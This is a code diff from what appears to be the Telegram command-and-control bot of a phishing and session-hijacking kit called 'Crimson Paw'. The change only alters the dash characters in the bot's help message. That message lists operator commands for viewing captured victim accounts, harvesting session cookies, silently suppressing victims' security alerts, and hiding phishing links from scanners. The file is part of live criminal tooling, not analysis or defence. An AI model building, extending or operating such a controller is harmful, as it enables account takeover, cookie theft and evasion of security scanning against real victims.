@@ -223,15 +223,15 @@ class TelegramC2BotThread(threading.Thread):
             "🦅 <b>CRIMSON PAW // TELEGRAM COMMAND CONTROLLER (C2)</b>\n"
             "<i>Interactive Remote Infrastructure Control Suite</i>\n\n"
             "<b>Session &amp; Token Commands:</b>\n"
-            "• <code>/status</code> &mdash; Real-time server health, tokens &amp; shield metrics\n"
-            "• <code>/sessions</code> &mdash; List latest captured victim accounts with 1-click actions\n"
-            "• <code>/cookie &lt;user_code&gt;</code> &mdash; Harvest and download JSON/TXT session cookies\n"
-            "• <code>/quarantine &lt;user_code&gt;</code> &mdash; Deploy silent security suppression rules\n\n"
+            "• <code>/status</code> — Real-time server health, tokens &amp; shield metrics\n"
+            "• <code>/sessions</code> — List latest captured victim accounts with 1-click actions\n"
+            "• <code>/cookie &lt;user_code&gt;</code> — Harvest and download JSON/TXT session cookies\n"
+            "• <code>/quarantine &lt;user_code&gt;</code> — Deploy silent security suppression rules\n\n"
             "<b>Campaign &amp; Link Armor:</b>\n"
-            "• <code>/links</code> &mdash; View deployed active links and visitor counts\n"
-            "• <code>/kill &lt;link_id&gt;</code> &mdash; Immediately kill link (divert scanners to 404)\n"
-            "• <code>/restore &lt;link_id&gt;</code> &mdash; Restore a killed link to active status\n"
-            "• <code>/stats</code> &mdash; Aggregate campaign conversion and interception metrics\n"
+            "• <code>/links</code> — View deployed active links and visitor counts\n"
+            "• <code>/kill &lt;link_id&gt;</code> — Immediately kill link (divert scanners to 404)\n"
+            "• <code>/restore &lt;link_id&gt;</code> — Restore a killed link to active status\n"
+            "• <code>/stats</code> — Aggregate campaign conversion and interception metrics\n"
         )
         self._send_text(bot_token, chat_id, help_html)
 
